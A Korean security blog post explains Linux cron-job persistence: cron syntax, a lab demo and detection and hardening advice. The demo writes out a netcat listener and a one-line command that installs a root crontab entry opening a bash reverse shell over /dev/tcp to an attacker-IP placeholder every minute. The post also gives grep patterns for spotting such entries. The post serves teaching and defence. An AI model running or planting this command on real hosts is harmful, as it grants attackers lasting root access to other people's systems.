---
layout: post
title: "Cron Job Persistence"
date: 2025-09-06 17:00:00 +0900
categories: [system-hacking]
---

## 1. 개요

**Cron Job Persistence**는 리눅스의 작업 스케줄러인 `cron`을 악용하여 악성 코드가 시스템에서 주기적으로 실행되도록 만드는 기법이다.
공격자가 초기 침투 후 재부팅이나 세션 종료가 발생하더라도 시스템 접근 권한을 잃지 않기 위해 사용(Persistence)하며, 리눅스 환경에서 가장 흔하게 발견되는 백도어 형태 중 하나이다.
본 글에서는 공격자가 crontab을 이용해 리버스 쉘을 유지하는 방법과 이를 탐지하고 차단하는 보안 대책을 다룬다.

---

## 2. Cron 기본 동작

`cron`은 특정 시간에 지정된 작업을 자동으로 실행하는 리눅스의 데몬이다. 사용자는 `crontab` 파일을 수정하여 작업을 예약할 수 있다.

*   **주요 경로**:
    *   `/etc/crontab`: 시스템 전체에 적용되는 cron 작업 파일. 사용자 계정을 지정하여 명령을 실행할 수 있다.
    *   `/var/spool/cron/crontabs/`: 사용자별 crontab 파일이 저장되는 디렉터리. `root` 사용자의 crontab은 여기에 위치한다.
*   **형식**:
    ```
    # ┌───────────── 분 (0 - 59)
    # │ ┌───────────── 시 (0 - 23)
    # │ │ ┌───────────── 일 (1 - 31)
    # │ │ │ ┌───────────── 월 (1 - 12)
    # │ │ │ │ ┌───────────── 요일 (0 - 6)
    # │ │ │ │ │
    # * * * * * <사용자> <실행할 명령어>
    ```

---

## 3. 공격 실습: 리버스 쉘

이전 단계에서 `root` 권한을 획득한 공격자가 매 분마다 공격자 PC로 리버스 쉘을 연결하는 상황을 가정한다.

#### 1. 공격자 리스너 실행
공격자 PC에서 `netcat`을 이용해 4444번 포트에서 연결을 대기한다.
```bash
nc -lvnp 4444
```

#### 2. 대상 서버에 cron 작업 등록
획득한 `root` 쉘에서 `root` 사용자의 crontab에 1분마다 리버스 쉘을 실행하는 작업을 추가한다. `crontab -e`를 사용하는 대신 `echo`와 파이프를 이용하여 비대화형(non-interactive) 방식으로 작업을 등록할 수 있다.
```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1'") | crontab -
```
![CronShell](/assets/images/system-hacking/Cron_1.png)

#### 3. 연결 수신 확인
cron 작업이 등록되고 1분 이내에 공격자 PC의 `netcat` 리스너는 대상 서버로부터 들어오는 `root` 권한의 쉘 연결을 수신하게 된다.
![Cronauto](/assets/images/system-hacking/Cron_2.png)

이제 대상 서버가 재부팅되거나 다른 관리자가 악성 프로세스를 종료시키더라도 `cron` 데몬은 매 분마다 공격자에게 다시 쉘을 제공하므로 공격자는 시스템에 대한 통제권을 잃지 않게 된다.

---

## 4. 탐지 방법

| 탐지 포인트 | 명령어/위치 |
|------------|------------|
| crontab 목록 | `crontab -l -u root` |
| 시스템 cron | `cat /etc/crontab` |
| cron 디렉터리 | `/etc/cron.d/`, `/etc/cron.daily/` |
| cron 로그 | `/var/log/cron` 또는 `/var/log/syslog` |

```bash
# 의심스러운 cron 작업 검색
grep -r "bash -i" /var/spool/cron/ /etc/cron* 2>/dev/null
grep -r "/dev/tcp" /var/spool/cron/ /etc/cron* 2>/dev/null
```

---

## 5. 보안 대책

*   **cron.allow/cron.deny**: `/etc/cron.allow`에 허용된 사용자만 등록하여 일반 사용자의 스케줄러 사용을 제한한다.
*   **파일 무결성 모니터링**: AIDE, Tripwire와 같은 도구를 사용하여 crontab 파일의 무단 변경을 실시간으로 감지한다.
*   **권한 최소화**: `root`가 아닌 최소 권한 사용자 계정으로 작업을 실행하도록 설정한다.
*   **정기 감사**: 주기적으로 cron 작업을 검토하고 알 수 없는 작업이 등록되어 있는지 확인한다.

<hr class="short-rule">